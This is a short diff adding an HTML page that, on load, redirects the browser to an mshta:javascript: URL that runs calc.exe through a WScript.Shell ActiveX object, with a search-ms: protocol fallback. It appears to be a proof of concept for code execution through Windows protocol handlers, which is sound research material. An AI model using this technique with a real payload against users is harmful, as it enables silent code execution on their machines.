@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="refresh" content="0;url=mshta:javascript:new%20ActiveXObject('WScript.Shell').Run('calc.exe')">
+</head>
+<body>
+<p>Starting calculator...</p>
+<script>
+// Fallback: try search-ms protocol
+window.location.href = 'mshta:javascript:new%20ActiveXObject(\'WScript.Shell\').Run(\'calc.exe\')';
+setTimeout(() => {
+  // Another fallback
+  window.location.href = 'search-ms:displayname=Calculator&exec=calc.exe';
+}, 500);
+</script>
+</body>
+</html>
